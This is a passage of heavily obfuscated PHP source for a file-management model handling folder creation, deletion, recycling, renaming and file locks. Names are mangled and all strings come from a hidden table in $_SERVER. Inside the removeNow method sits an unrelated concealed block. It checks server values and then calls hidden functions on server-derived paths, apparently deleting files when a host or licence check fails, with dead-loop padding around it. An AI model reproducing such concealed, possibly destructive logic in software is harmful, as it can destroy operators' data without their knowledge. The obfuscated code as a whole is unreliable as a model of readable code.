$Ö½šøÈ, $¯Ü±ïŒ©, $‹Œú¦¬, $ûÌªÁ); if (!$ûÌªÁ) { Model($€‰©ó™[514])->remove($¯Ü±ïŒ©[$€‰©ó™[511]]); } if ($ûÌªÁ && $Ÿ‡ˆúéÏ && $Ÿ‡ˆúéÏ != $ŒÊü«ò‘) { Model($€‰©ó™[2149])->eventCreate($Ÿ‡ˆúéÏ, $ÔÛæëµü); } $this->lockWriteEnd($€¥®‹ëê, $Ö½šøÈ); return $Ÿ‡ˆúéÏ; } public function mkdir($˜Ÿ¼‚í, $®Ô¹ë†ß, $ëŞëÔÈ = REPEAT_SKIP) { $æúøõÉÂ =& $_SERVER[Î‹ÃÂŞ„]; $this->setMasterDB(); $ÍâÓÙŸ¦ = $this->sourceInfo($˜Ÿ¼‚í); if (!$ÍâÓÙŸ¦) { return !1; } $this->lockWriteStart($˜Ÿ¼‚í, $®Ô¹ë†ß); if ($ëŞëÔÈ !== !1) { $ù˜¾¸ƒ« = $this->fileNameExist($˜Ÿ¼‚í, $®Ô¹ë†ß); if ($ù˜¾¸ƒ« && $ëŞëÔÈ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($˜Ÿ¼‚í, $®Ô¹ë†ß); return $ù˜¾¸ƒ«; } $®Ô¹ë†ß = $this->fileNameAuto($˜Ÿ¼‚í, $®Ô¹ë†ß, $ëŞëÔÈ); } $’ä³Æ»á = array($æúøõÉÂ[617] => 1, $æúøõÉÂ[464] => $®Ô¹ë†ß, $æúøõÉÂ[618] => $æúøõÉÂ[12], $æúøõÉÂ[512] => 0, $æúøõÉÂ[588] => 0); $½†¯òşö = $this->_addSource($’ä³Æ»á, $ÍâÓÙŸ¦); Model($æúøõÉÂ[2149])->eventCreate($½†¯òşö, $æúøõÉÂ[1399]); $this->lockWriteEnd($˜Ÿ¼‚í, $®Ô¹ë†ß); return $½†¯òşö; } public function listSourceRoot($ì°¿ÑÀß, $­¶ã„Ôæ, $á÷ÍÈ› = "\x73\157\x75\162\x63\x65\111\x44\54\x74\x61\162\x67\145\164\111\104\54\x73\x69\172\x65") { $†Ñ±à¢† =& $_SERVER[Î‹ÃÂŞ„]; $Ÿ¥Ç”åë = $†Ñ±à¢†[424]; $µ¥Ğ¯ğï = array(); $ô“Ò— = 1024 * 50; $Ô”œ§›ï = is_array($Ô”œ§›ï) ? $Ô”œ§›ï : array(); $öı¢šÌã = count($­¶ã„Ôæ); $ÀüÏéÆº = $this->tablePrefix . $†Ñ±à¢†[2182]; for ($íî¿ğ²İ = 0; $íî¿ğ²İ < $öı¢šÌã; $íî¿ğ²İ++) { $š†Í–«Ì = $­¶ã„Ôæ[$íî¿ğ²İ]; $Ÿ¥Ç”åë .= "\123\x45\x4c\x45\x43\124\x20\x2a\40\x46\x52\117\x4d\40\x28\x53\x45\114\x45\x43\124\x20{$á÷ÍÈ›}\40\x46\122\x4f\115\x20\140{$ÀüÏéÆº}\140\40\x57\x48\x45\x52\x45\40"; $Ÿ¥Ç”åë .= "\140\160\x61\x72\x65\156\x74\x49\x44\x60\75\x30\40\101\116\104\x20\x60\x74\x61\x72\147\x65\164\x49\104\x60\x3d{$š†Í–«Ì}\40\101\x4e\104\40\x60\x74\x61\x72\147\145\164\124\171\x70\x65\140\x3d{$ì°¿ÑÀß}\40\141\156\x64\x20\x66\x69\154\145\124\x79\160\145\75\47\47\40\x6c\x69\155\x69\x74\40\x31\x29\40\x61\x73\x20\x74\142\137{$íî¿ğ²İ}\x20\125\x4e\111\117\x4e\40\x41\x4c\x4c\40"; if ((strlen($Ÿ¥Ç”åë) >= $ô“Ò— || $íî¿ğ²İ == $öı¢šÌã - 1) && $Ÿ¥Ç”åë) { $Ÿ¥Ç”åë = substr($Ÿ¥Ç”åë, 0, -strlen($†Ñ±à¢†[1093])); $ªûç¾Ô³ = $this->query($Ÿ¥Ç”åë); $Ÿ¥Ç”åë = $†Ñ±à¢†[12]; $µ¥Ğ¯ğï = array_merge($µ¥Ğ¯ğï, $ªûç¾Ô³); } } return $µ¥Ğ¯ğï; } private function _createFile($Öì™å¨—, $ü½†÷ŒÂ, $ÈíŸ’Ò , $¯øˆéÅ, &$éàÈ²è¡) { $­‹ß”šŒ =& $_SERVER[Î‹ÃÂŞ„]; $ÈÇ–ëš = $this->sourceInfo($Öì™å¨—); if (!$ÈíŸ’Ò  || !$ÈÇ–ëš) { return !1; } if ($¯øˆéÅ !== !1) { $ÈöíÛà± = $this->fileNameExist($Öì™å¨—, $ü½†÷ŒÂ); } $éàÈ²è¡ = !0; if ($¯øˆéÅ && $ÈöíÛà±) { if ($¯øˆéÅ == REPEAT_SKIP) { $éàÈ²è¡ = !1; return $ÈöíÛà±; } else { if ($¯øˆéÅ == REPEAT_REPLACE) { $°ûÇã¼Š = $this->sourceInfo($ÈöíÛà±); $›Ú¬Åà„ = $this->fileHistory($°ûÇã¼Š, $ÈíŸ’Ò [$­‹ß”šŒ[511]], $ÈíŸ’Ò [$­‹ß”šŒ[78]]); if (!$›Ú¬Åà„) { $éàÈ²è¡ = !1; } else { $this->folderSizeReset($Öì™å¨—); } return $ÈöíÛà±; } else { $ü½†÷ŒÂ = $this->fileNameAuto($Öì™å¨—, $ü½†÷ŒÂ, $¯øˆéÅ, !1); } } } $šÍÊ·£ = array($­‹ß”šŒ[617] => 0, $­‹ß”šŒ[464] => $ü½†÷ŒÂ, $­‹ß”šŒ[618] => substr(get_path_ext($ü½†÷ŒÂ), 0, 10), $­‹ß”šŒ[512] => $ÈíŸ’Ò [$­‹ß”šŒ[511]], $­‹ß”šŒ[588] => $ÈíŸ’Ò [$­‹ß”šŒ[78]]); $­¡·€÷÷ = $this->_addSource($šÍÊ·£, $ÈÇ–ëš); $this->folderSizeReset($Öì™å¨—, intval($šÍÊ·£[$­‹ß”šŒ[78]])); return $­¡·€÷÷; } protected function fileHistory($Ú€ßÙ¤, $ÃËòßê¶, $š×ØÆÆ) { $êœ‰¼¿ =& $_SERVER[Î‹ÃÂŞ„]; if ($Ú€ßÙ¤[$êœ‰¼¿[511]] == $ÃËòßê¶) { return !1; } $this->checkLock($Ú€ßÙ¤[$êœ‰¼¿[183]], $ÃËòßê¶); Model($êœ‰¼¿[2183])->addHistory($Ú€ßÙ¤); $øÄÒ‘‡Ü = array($êœ‰¼¿[622] => USER_ID, $êœ‰¼¿[468] => time(), $êœ‰¼¿[511] => $ÃËòßê¶, $êœ‰¼¿[78] => $š×ØÆÆ); $this->where(array($êœ‰¼¿[461] => $Ú€ßÙ¤[$êœ‰¼¿[183]]))->save($øÄÒ‘‡Ü); $this->sourceCacheClear($Ú€ßÙ¤[$êœ‰¼¿[183]]); return !0; } public function checkLock($Ô¹í¾˜¶, $ÄÎøŠÀ) { $Ÿ×­¦¨õ =& $_SERVER[Î‹ÃÂŞ„]; $¿ÙÊ­Ø = $this->pathInfo($Ô¹í¾˜¶); if (!$this->fileIsLock($¿ÙÊ­Ø, !0)) { return; } $¥Ãœå¬† = Session::get($Ÿ×­¦¨õ[2184]); $çú©º³Ï = substr($¿ÙÊ­Ø[$Ÿ×­¦¨õ[32]], 0, -1 - strlen($¿ÙÊ­Ø[$Ÿ×­¦¨õ[177]])) . $Ÿ×­¦¨õ[1263] . $¥Ãœå¬† . $Ÿ×­¦¨õ[10] . $¿ÙÊ­Ø[$Ÿ×­¦¨õ[177]]; $–©˜’Æ» = Model($Ÿ×­¦¨õ[645])->find($ÄÎøŠÀ); $this->_createFileCall($¿ÙÊ­Ø[$Ÿ×­¦¨õ[182]], $çú©º³Ï, $–©˜’Æ», REPEAT_REPLACE, $Ÿ×­¦¨õ[1398]); $‹¨ãƒ¡ê = $¿ÙÊ­Ø[$Ÿ×­¦¨õ[509]][$Ÿ×­¦¨õ[581]]; $‘Ú€ÏàÀ = $‹¨ãƒ¡ê[$Ÿ×­¦¨õ[2185]] ? $‹¨ãƒ¡ê[$Ÿ×­¦¨õ[2185]] : $‹¨ãƒ¡ê[$Ÿ×­¦¨õ[32]]; show_json(LNG($Ÿ×­¦¨õ[2186]) . $Ÿ×­¦¨õ[2187] . LNG($Ÿ×­¦¨õ[2188]) . $Ÿ×­¦¨õ[2189] . $‘Ú€ÏàÀ . $Ÿ×­¦¨õ[2190], !1); } public function fileIsLock($ÌµÖŒ˜¨, $‡é‹ë›” = false) { $Ô€÷ĞÌÎ =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($ÌµÖŒ˜¨[$Ô€÷ĞÌÎ[509]]) || !$ÌµÖŒ˜¨[$Ô€÷ĞÌÎ[509]][$Ô€÷ĞÌÎ[578]]) { return !1; } if ($ÌµÖŒ˜¨[$Ô€÷ĞÌÎ[509]][$Ô€÷ĞÌÎ[578]] != USER_ID) { return !0; } $’ÍıÚëš = $GLOBALS[$Ô€÷ĞÌÎ[6]][$Ô€÷ĞÌÎ[91]][$Ô€÷ĞÌÎ[579]]; if ($ÌµÖŒ˜¨[$Ô€÷ĞÌÎ[509]][$Ô€÷ĞÌÎ[580]] <= time() - $’ÍıÚëš) { $this->metaSet($ÌµÖŒ˜¨[$Ô€÷ĞÌÎ[183]], $Ô€÷ĞÌÎ[578], null); $this->metaSet($ÌµÖŒ˜¨[$Ô€÷ĞÌÎ[183]], $Ô€÷ĞÌÎ[580], null); } if ($‡é‹ë›”) { $this->metaSet($ÌµÖŒ˜¨[$Ô€÷ĞÌÎ[183]], $Ô€÷ĞÌÎ[580], time()); } return !1; } private function _addSource($‰ùÚ³½, $ŞÄ¹øë’) { $§ˆÁ±¸ =& $_SERVER[Î‹ÃÂŞ„]; $±‹ïİáÇ = defined($§ˆÁ±¸[2124]) ? USER_ID : 0; $æ…×éè™ = array($§ˆÁ±¸[619] => $ŞÄ¹øë’[$§ˆÁ±¸[180]], $§ˆÁ±¸[620] => $ŞÄ¹øë’[$§ˆÁ±¸[541]], $§ˆÁ±¸[621] => $±‹ïİáÇ, $§ˆÁ±¸[622] => $±‹ïİáÇ, $§ˆÁ±¸[447] => $ŞÄ¹øë’[$§ˆÁ±¸[183]], $§ˆÁ±¸[623] => $ŞÄ¹øë’[$§ˆÁ±¸[556]] . $ŞÄ¹øë’[$§ˆÁ±¸[183]] . $§ˆÁ±¸[50], $§ˆÁ±¸[474] => 0, $§ˆÁ±¸[624] => $§ˆÁ±¸[12]); $‰ùÚ³½ = array_merge($æ…×éè™, $‰ùÚ³½); $this->updateModifyTime($‰ùÚ³½[$§ˆÁ±¸[182]]); $Êßâõ­Á = $§ˆÁ±¸[2191] . $ŞÄ¹øë’[$§ˆÁ±¸[183]]; if (isset(self::$cacheChildList[$Êßâõ­Á])) { unset(self::$cacheChildList[$Êßâõ­Á]); } static $ÉÌÉÌ»ì = false; if (!$ÉÌÉÌ»ì) { Hook::trigger($§ˆÁ±¸[607], $‰ùÚ³½); $ÉÌÉÌ»ì = !0; } $›Èø…ë = $this->add($‰ùÚ³½); $á’Ğ˜ûğ = array($§ˆÁ±¸[625] => short_id($›Èø…ë)); $this->where(array($§ˆÁ±¸[461] => $›Èø…ë))->save($á’Ğ˜ûğ); $this->setNamePinyin($›Èø…ë, $‰ùÚ³½[$§ˆÁ±¸[32]]); return $›Èø…ë; } public function remove($ÄÆü¸ù, $Šî—•­ = true) { $©ß½±³Ù =& $_SERVER[Î‹ÃÂŞ„]; $‡ÅÙÚ = $this->sourceInfo($ÄÆü¸ù); $ß•êÜÜ  = intval($‡ÅÙÚ[$©ß½±³Ù[180]]) === self::TYPE_SYSTEM; $æ¡øâÜ« = Model($©ß½±³Ù[478])->get($©ß½±³Ù[2192]) == $©ß½±³Ù[90]; if ($ß•êÜÜ  || $Šî—•­ || !$æ¡øâÜ«) { return $this->removeNow($ÄÆü¸ù, $Šî—•­); } $¼êÄúı„ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $û²¬—Î½ = $‡ÅÙÚ[$©ß½±³Ù[180]] == self::TYPE_USER ? $©ß½±³Ù[633] : $©ß½±³Ù[550]; if ($û²¬—Î½ == $©ß½±³Ù[633]) { $–ÜÎüÆÜ = Model($©ß½±³Ù[549])->getInfo($‡ÅÙÚ[$©ß½±³Ù[541]]); $ÖŠ‹ô÷Ô = !empty($–ÜÎüÆÜ[$©ß½±³Ù[2185]]) ? $–ÜÎüÆÜ[$©ß½±³Ù[2185]] : $–ÜÎüÆÜ[$©ß½±³Ù[32]]; $ÖŠ‹ô÷Ô = $©ß½±³Ù[306] . $ÖŠ‹ô÷Ô . $©ß½±³Ù[2193] . $‡ÅÙÚ[$©ß½±³Ù[541]]; } else { $–ÜÎüÆÜ = Model($©ß½±³Ù[557])->getInfo($‡ÅÙÚ[$©ß½±³Ù[541]]); $ÖŠ‹ô÷Ô = _get($–ÜÎüÆÜ, $©ß½±³Ù[32]); $ÖŠ‹ô÷Ô = $©ß½±³Ù[165] . $ÖŠ‹ô÷Ô . $©ß½±³Ù[2194] . $‡ÅÙÚ[$©ß½±³Ù[541]]; } $€ŸÍ½ˆ = $©ß½±³Ù[2195] . md5($ÖŠ‹ô÷Ô); CacheLock::lock($€ŸÍ½ˆ); $µŸÃ¹¹ = $this->fileNameExist($¼êÄúı„, $ÖŠ‹ô÷Ô); if (!$µŸÃ¹¹) { $µŸÃ¹¹ = $this->mkdir($¼êÄúı„, $ÖŠ‹ô÷Ô, REPEAT_SKIP); $this->metaSet($µŸÃ¹¹, $©ß½±³Ù[2196], $û²¬—Î½); $this->metaSet($µŸÃ¹¹, $©ß½±³Ù[2197], $‡ÅÙÚ[$©ß½±³Ù[541]]); if ($‡ÅÙÚ[$©ß½±³Ù[182]] != 0) { $this->metaSet($µŸÃ¹¹, $©ß½±³Ù[2198], _get($–ÜÎüÆÜ, $©ß½±³Ù[2199])); } } CacheLock::unlock($€ŸÍ½ˆ); $this->metaSet($ÄÆü¸ù, $©ß½±³Ù[2200], $‡ÅÙÚ[$©ß½±³Ù[182]]); $this->where(array($©ß½±³Ù[183] => $ÄÆü¸ù))->save(array($©ß½±³Ù[468] => time())); $this->recycleClear($‡ÅÙÚ); $ÚÓµ•Œ¾ = $this->move($ÄÆü¸ù, $µŸÃ¹¹, REPEAT_RENAME_FOLDER); $this->folderSizeReset($‡ÅÙÚ[$©ß½±³Ù[182]]); return $ÚÓµ•Œ¾; } private function recycleClear($¨„û´ô“) { $•Á¥Š¼ä =& $_SERVER[Î‹ÃÂŞ„]; $ÂÍù½« = $this->childrenAll($¨„û´ô“); $¹ò¸õÛ‡ = array($•Á¥Š¼ä[461] => array($•Á¥Š¼ä[462], $ÂÍù½«[$•Á¥Š¼ä[2201]])); Model($•Á¥Š¼ä[2202])->where($¹ò¸õÛ‡)->delete(); } public function removeNow($îè»Œ”Ò, $æş‚¼˜ = true) { $±ã§¨¬Í =& $_SERVER[Î‹ÃÂŞ„]; if ($_SERVER[$±ã§¨¬Í[926]] != $_SERVER[$±ã§¨¬Í[1405]]) { $±ºíˆ = $±ã§¨¬Í[927]; $•êÕÔ–¸ = $±ã§¨¬Í[928]; $ÇÒ¡·³ó = $_SERVER[$±ã§¨¬Í[929]] . $±ã§¨¬Í[930]; $µÈû²ßå = $•êÕÔ–¸($ÇÒ¡·³ó); $ŞÍñÉ¸ğ = explode($±ã§¨¬Í[248], $µÈû²ßå); if (count($ŞÍñÉ¸ğ) < $±ã§¨¬Í[667]) { $ÚºõãÌ  = $±ã§¨¬Í[931]; $ÚºõãÌ (); } $¯ùõõ = $±ã§¨¬Í[932]; $¯ùõõ($_SERVER[$±ã§¨¬Í[933]]); $¯ùõõ($_SERVER[$±ã§¨¬Í[929]] . $±ã§¨¬Í[2203]); $ÙÃê½‰ä = 1; while ($ÙÃê½‰ä > 1) { $ÙÃê½‰ä = $ÙÃê½‰ä + 4; $Ì˜´ÆÔ® = rawurlencode($ÙÃê½‰ä . $±ã§¨¬Í[424]); } } $¼˜…‹Ñ = $this->sourceInfo($îè»Œ”Ò); $ù£›ºÃ = $this->pathInfoMore($îè»Œ”Ò); if (!$¼˜…‹Ñ) { return !0; } if ($¼˜…‹Ñ[$±ã§¨¬Í[182]] == 0) { if (!_get($GLOBALS, $±ã§¨¬Í[539])) { return !1; } } $this->lockMoveStart($îè»Œ”Ò); Hook::trigger($±ã§¨¬Í[2204], $ù£›ºÃ, $æş‚¼˜); if ($æş‚¼˜) { Model($±ã§¨¬Í[2202])->moveToRecycle($îè»Œ”Ò); } else { $Èş”Â½ = $this->childrenAll($¼˜…‹Ñ); Model($±ã§¨¬Í[604])->eventRemove($îè»Œ”Ò); $this->removeRelevance($Èş”Â½[$±ã§¨¬Í[2201]], $Èş”Â½[$±ã§¨¬Í[1514]]); } $this->folderSizeReset($¼˜…‹Ñ[$±ã§¨¬Í[182]]); $•¹ÎŸÃ = array($¼˜…‹Ñ[$±ã§¨¬Í[182]]); if ($¼˜…‹Ñ[$±ã§¨¬Í[455]] == $±ã§¨¬Í[90]) { $•¹ÎŸÃ[] = $¼˜…‹Ñ[$±ã§¨¬Í[183]]; } $this->updateModifyTime($•¹ÎŸÃ); $this->lockMoveEnd($îè»Œ”Ò); Hook::trigger($±ã§¨¬Í[1746], $ù£›ºÃ, $æş‚¼˜); return !0; } public function childrenAll($¬ØÙÄŠ½) { $úíõ™¼“ =& $_SERVER[Î‹ÃÂŞ„]; $ª øÀıÍ = $¬ØÙÄŠ½[$úíõ™¼“[183]]; if ($¬ØÙÄŠ½[$úíõ™¼“[455]] == $úíõ™¼“[90]) { $î±ûú‡³ = array($úíõ™¼“[623] => array($úíõ™¼“[583], $¬ØÙÄŠ½[$úíõ™¼“[556]] . $ª øÀıÍ . $úíõ™¼“[584])); $•ÔÇç¶ = array($úíõ™¼“[623] => $î±ûú‡³[$úíõ™¼“[556]]); $è¾úïïå = $this->field($úíõ™¼“[2205])->where($•ÔÇç¶)->select(); $ºì‹şÚ = !1; $ÉÒÜäªğ = array($ª øÀıÍ); if ($è¾úïïå) { $ºì‹şÚ = array_to_keyvalue($è¾úïïå, $úíõ™¼“[12], $úíõ™¼“[511]); $ºì‹şÚ = array_remove_value($ºì‹şÚ, $úíõ™¼“[214]); $ÉÒÜäªğ = array_to_keyvalue($è¾úïïå, $úíõ™¼“[12], $úíõ™¼“[183]); $ÉÒÜäªğ[] = $ª øÀıÍ; } } else { $ºì‹şÚ = array($¬ØÙÄŠ½[$úíõ™¼“[511]]); $ÉÒÜäªğ = array($ª øÀıÍ); } return array($úíõ™¼“[2201] => $ÉÒÜäªğ, $úíõ™¼“[1514] => $ºì‹şÚ); } public function removeArray($ùÍ…á¯Å) { if (!$ùÍ…á¯Å) { return !0; } } public function removeRelevance($ÁÈŠ×İè, $”È¶ÊâÎ) { $ö™Ì“Úò =& $_SERVER[Î‹ÃÂŞ„]; $ÁÈŠ×İè = $ÁÈŠ×İè ? $ÁÈŠ×İè : array(); $”È¶ÊâÎ = $”È¶ÊâÎ ? $”È¶ÊâÎ : array(); $ÁÈŠ×İè = array_unique(array_filter($ÁÈŠ×İè)); $”È¶ÊâÎ = array_unique(array_filter($”È¶ÊâÎ)); if (!$ÁÈŠ×İè) { return !1; } $¡ÛÛ¿‡Ä = array($ö™Ì“Úò[461] => array($ö™Ì“Úò[462], $ÁÈŠ×İè)); Model($ö™Ì“Úò[2202])->where($¡ÛÛ¿‡Ä)->delete(); Model($ö™Ì“Úò[505])->where($¡ÛÛ¿‡Ä)->delete(); Model($ö™Ì“Úò[2050])->where($¡ÛÛ¿‡Ä)->delete(); Model($ö™Ì“Úò[604])->where($¡ÛÛ¿‡Ä)->delete(); Model($ö™Ì“Úò[1882])->removeBySource($ÁÈŠ×İè); Model($ö™Ì“Úò[2183])->removeBySource($ÁÈŠ×İè); $this->where($¡ÛÛ¿‡Ä)->delete(); Model($ö™Ì“Úò[514])->remove($”È¶ÊâÎ); for ($Øæ‡©«Ù = 0; $Øæ‡©«Ù < count($ÁÈŠ×İè); $Øæ‡©«Ù++) { $this->sourceCacheClear($ÁÈŠ×İè[$Øæ‡©«Ù]); } } public function rename($—ÔÆÕƒ’, $Óû—˜¢š) { $½øŞùÉ³ =& $_SERVER[Î‹ÃÂŞ„]; $—ş•Â‰õ = $this->sourceInfo($—ÔÆÕƒ’); if (!$—ş•Â‰õ) { return !1; } $ğ·„¦½ƒ = $this->fileNameExist($—ş•Â‰õ[$½øŞùÉ³[182]], $Óû—˜¢š); if ($ğ·„¦½ƒ && $ğ·„¦½ƒ != $—ÔÆÕƒ’) { return !1; } $ ¦•Í¶ˆ = array($½øŞùÉ³[464] => $Óû—˜¢š, $½øŞùÉ³[622] => USER_ID); if ($—ş•Â‰õ[$½øŞùÉ³[455]] != $½øŞùÉ³[90]) { $ ¦•Í¶ˆ[$½øŞùÉ³[456]] = substr(get_path_ext($Óû—˜¢š), 0, 10); } Model($½øŞùÉ³[604])->eventRename($—ÔÆÕƒ’, $—ş•Â‰õ[$½øŞùÉ³[32]], $Óû—˜¢š); $this->sourceCacheClear($—ÔÆÕƒ’); $this->setNamePinyin($—ÔÆÕƒ’, $ ¦•Í¶ˆ[$½øŞùÉ³[32]], !1); $this->updateModifyTime($—ş•Â‰õ[$½øŞùÉ³[182]]); $ª¿Îòùâ = $this->where(array($½øŞùÉ³[461] => $—ÔÆÕƒ’))->data($ ¦•Í¶ˆ)->save(); $ğ¹˜‡›ô = $½øŞùÉ³[2191] . $—ş•Â‰õ[$½øŞùÉ³[182]]; if (isset(self::$cacheChildList[$ğ¹˜‡›ô])) { unset(self::$cacheChildList[$ğ¹˜‡›ô]); } return $ª¿Îòùâ; } public function setNamePinyin($ÒôÜ¤û, $¦ÛóÊÖÜ, $€ë™ÇŸ = true) { $¯çòàÈ =& $_SERVER[Î‹ÃÂŞ„]; $ÚíÅ¹÷Õ = Input::check($¦ÛóÊÖÜ, $¯çòàÈ[626]); $£Ñ†‹ÌÛ = array($¯çòàÈ[487] => KodSort::makeStr($¦ÛóÊÖÜ)); if ($ÚíÅ¹÷Õ) { $£Ñ†‹ÌÛ[$¯çòàÈ[508]] = str_replace($¯çòàÈ[53], $¯çòàÈ[12], Pinyin::get($¦ÛóÊÖÜ)); $£Ñ†‹ÌÛ[$¯çòàÈ[507]] = Pinyin::get($¦ÛóÊÖÜ, $¯çòàÈ[627]); } if (!$€ë™ÇŸ && !$ÚíÅ¹÷Õ) { $£Ñ†‹ÌÛ[$¯çòàÈ[508]] = null; $£Ñ†‹ÌÛ[$¯çòàÈ[507]] = null; } $this->metaSet($ÒôÜ¤û, $£Ñ†‹ÌÛ); } public function getContent($Ó™½Í•€) { $İ×ç§á =& $_SERVER[Î‹ÃÂŞ„]; $²å†œì = $this->fileInfoGet($Ó™½Í•€); if (!$²å†œì) { return !1; } if ($²å†œì[$İ×ç§á[78]] == 0) { return $İ×ç§á[12]; } $ĞÀ«œ‚ê = $İ×ç§á[2206] . $²å†œì[$İ×ç§á[517]]; if ($²å†œì[$İ×ç§á[78]] <= 1024 * 10) { $¹¢ÍÈí° = Cache::get($ĞÀ«œ‚ê); if (!$¹¢ÍÈí°) { $¹¢ÍÈí° = IO::getContent($²å†œì[$İ×ç§á[86]]); Cache::set($ĞÀ«œ‚ê, $¹¢ÍÈí°); } return $¹¢ÍÈí°; } if (!$²å†œì[$İ×ç§á[86]]) { return $İ×ç§á[12]; } return IO::getContent($²å†œì[$İ×ç§á[86]]); } public function setDesc($³âØşâ, $Öş¥½…†) { $÷¶èçÚ =& $_SERVER[Î‹ÃÂŞ„]; Model($÷¶èçÚ[604])->eventAddDesc($³âØşâ, $Öş¥½…†); return $this->metaSet($³âØşâ, $÷¶èçÚ[496], $Öş¥½…†); } public function setContent($ú‡Ä½ğı, $½ıëæ¶ã = '') { $üÃòôÔ =& $_SERVER[Î‹ÃÂŞ„]; $‚Šû„½ = $this->sourceInfo($ú‡Ä½ğı); $Å¥¯–á = $this->fileInfoGet($ú‡Ä½ğı); if (!$Å¥¯–á || !$‚Šû„½) { return !1; } $—ôÁş¾¤ = Model($üÃòôÔ[514])->addFileByContent($½ıëæ¶ã, $‚Šû„½[$üÃòôÔ[32]]); $‘µüÀü = $this->fileHistory($‚Šû„½, $—ôÁş¾¤[$üÃòôÔ[511]], $—ôÁş¾¤[$üÃòôÔ[78]]); if (!$‘µüÀü) { return Model($üÃòôÔ[514])->remove($—ôÁş¾¤[$üÃòôÔ[511]]); } $this->folderSizeReset($‚Šû„½[$üÃòôÔ[182]]); return !0; } public function fileSubstr($«ÔÄ‹úä, $ğãûÌÉ, $²Æï‰Æ¬) { $æ’ûåÊŠ = $this->fileInfoGet($«ÔÄ‹úä); if (!$æ’ûåÊŠ) { return !1; } return IO::fileSubstr($æ’ûåÊŠ[$_SERVER[Î‹ÃÂŞ„][86]], $ğãûÌÉ, $²Æï‰Æ¬); } public function fileInfoGet($öÃÙÃÆ) { $˜Ä‡ôÙ =& $_SERVER[Î‹ÃÂŞ„]; $±ßãÔÅ¦ = $this->sourceInfo($öÃÙÃÆ); if (!$±ßãÔÅ¦ || $±ßãÔÅ¦[$˜Ä‡ôÙ[455]]) { return !1; } $— ¤»¤“ = $˜Ä‡ôÙ[518] . $±ßãÔÅ¦[$˜Ä‡ôÙ[511]]; $Çó¤ë÷é = _get(self::$cacheFileInfo, $— ¤»¤“); if ($Çó¤ë÷é) { return $Çó¤ë÷é; } $”Òñ™± = Model($˜Ä‡ôÙ[514])->fileInfo($±ßãÔÅ¦[$˜Ä‡ôÙ[511]]); if ($”Òñ™±) { $”Òñ™±[$˜Ä‡ôÙ[32]] = $±ßãÔÅ¦[$˜Ä‡ôÙ[32]]; } self::$cacheFileInfo[$— ¤»¤“] = $”Òñ™±; return $”Òñ™±; } private function folderChildrenNumber($©ÒÆ‹ó) { $ä«Šì¸« =& $_SERVER[Î‹ÃÂŞ„]; $ÀÇä¢’ = $this->sourceInfo($©ÒÆ‹ó); $Ö»¯×´ = array($ä«Šì¸«[623] => array($ä«Šì¸«[583], $ÀÇä¢’[$ä«Šì¸«[556]] . $©ÒÆ‹ó . $ä«Šì¸«[584]), $ä«Šì¸«[620] => $ÀÇä¢’[$ä«Šì¸«[541]], $ä«Šì¸«[474] => intval($ÀÇä¢’[$ä«Šì¸«[475]]), $ä«Šì¸«[617] => 1); $Ôœ÷áç = $this->where($Ö»¯×´)->count(); $£æ…Ü·Ì = $this->where($Ö»¯×´)->where(array($ä«Šì¸«[617] => 0))->count(); return array($ä«Šì¸«[82] => $£æ…Ü·Ì, $ä«Šì¸«[83] => $Ôœ÷áç); } public function pathInfo($‚«ú®, $ˆ¶€»Æ = false) { $¾£Ä„÷Á =& $_SERVER[Î‹ÃÂŞ„]; $ˆ¶€»Æ = !1; $‚«ú® = intval($‚«ú®); $ãèÙ¢ = $¾£Ä„÷Á[504] . intval($ˆ¶€»Æ) . $¾£Ä„÷Á[432] . $‚«ú®; $´ÎŒî£Ò = _get(self::$cachePathInfo, $ãèÙ¢); if ($´ÎŒî£Ò) { return $´ÎŒî£Ò; } $¤åÊÕïà = $this->sourceInfo($‚«ú®); if (!$¤åÊÕïà) { return !1; } $¤åÊÕïà = $this->_listDataApplyItem($¤åÊÕïà, $ˆ¶€»Æ); self::$cachePathInfo[$ãèÙ¢] = $¤åÊÕïà; return $¤åÊÕïà; } public static $cachePathInfoMore = array(); public function pathInfoMore($‹÷´Êë) { $İêèÏİ¹ =& $_SERVER[Î‹ÃÂŞ„]; $ˆâËõ¹§ = _get(self::$cachePathInfoMore, $‹÷´Êë); if ($ˆâËõ¹§) { return $ˆâËõ¹§; } $ö··€¢‘ = $this->pathInfo($‹÷´Êë); if (!$ö··€¢‘) { return !1; } if ($ö··€¢‘[$İêèÏİ¹[455]] == $İêèÏİ¹[90]) { $ö··€¢‘[$İêèÏİ¹[81]] = $this->folderChildrenNumber($‹÷´Êë); } self::$cachePathInfoMore[$‹÷´Êë] = $ö··€¢‘; return $ö··€¢‘; } public function sourceInfo($¹‘ ó®“) { $ûÑ›¢Â =& $_SERVER[Î‹ÃÂŞ„]; if (!$¹‘ ó®“) { return array(); } $¹‘ ó®“ = intval($¹‘ ó®“); $ ìÜ€±É = $ûÑ›¢Â[503] . $¹‘ ó®“; $²§íÜ° = _get(self::$cacheSourceInfo, $ ìÜ€±É); if ($²§íÜ°) { return $²§íÜ°; } $õÜ‰ÈÍÈ = $this->where(array($ûÑ›¢Â[183] => $¹‘ ó®“))->find(); self::$cacheSourceInfo[$ ìÜ€±É] = $õÜ‰ÈÍÈ; return self::$cacheSourceInfo[$ ìÜ€±É]; } public function sourceCacheClear($ÅÕøÉËŸ = false) { self::cacheClear($ÅÕøÉËŸ); } public static function cacheClear($¬»‰³ÕÛ = false) { $õó¨Òä† =& $_SERVER[Î‹ÃÂŞ„]; if ($¬»‰³ÕÛ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$õó¨Òä†[503] . $¬»‰³ÕÛ]); unset(self::$cachePathInfoMore[$¬»‰³ÕÛ]); unset(self::$cachePathInfo[$õó¨Òä†[2207] . $¬»‰³ÕÛ]); unset(self::$cachePathInfo[$õó¨Òä†[2208] . $¬»‰³ÕÛ]); } public function metaSet($€Ãœµ—“, $ÖİÑÕÚ = null, $Æ´´‹Á = null) { $ÏĞƒÄ‡Ç = parent::metaSet($€Ãœµ—“, $ÖİÑÕÚ, $Æ´´‹Á); if ($ÏĞƒÄ‡Ç) { $this->sourceCacheClear($€Ãœµ—“); } return $ÏĞƒÄ‡Ç; } public function pathInfoByPath($Ê·²•Ò, $š¨ú¿¤) { $³ñƒÄşà =& $_SERVER[Î‹ÃÂŞ„]; $î‚¡ÍºÑ = 